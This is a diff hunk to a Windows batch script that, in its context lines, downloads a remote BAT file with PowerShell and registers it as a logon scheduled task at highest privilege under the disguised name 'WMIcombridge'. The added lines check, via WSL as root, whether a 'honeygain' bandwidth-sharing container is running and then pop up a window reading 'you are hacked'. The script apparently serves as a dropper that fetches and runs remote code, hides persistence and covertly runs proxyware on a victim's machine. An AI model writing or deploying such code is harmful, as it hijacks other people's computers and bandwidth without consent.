@@ -50,6 +50,20 @@ powershell -Command "Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%DOWNLOAD_PATH
 :: Create scheduled task to run the downloaded BAT file at user logon
 schtasks /create /tn "WMIcombridge" /tr "\"%DOWNLOAD_PATH%\"" /sc onlogon /rl HIGHEST /f
 
+:: Wait for 20 seconds before checking container status
+echo Waiting 20 seconds before checking if Docker container is running...
+timeout /t 20 /nobreak >nul
+
+:: Check if the container is running
+echo Checking if 'honeygain' Docker container is running...
+wsl -u root -e sh -c "docker ps | grep honeygain" >nul
+
+if %errorlevel% equ 0 (
+    echo Container is running. Opening CMD window as an indicator...
+    start cmd /k echo you are hacked
+) else (
+    echo Container is NOT running. Please check Docker setup.
+)
 echo.
 echo All tasks completed. You may need to reboot.
 pause
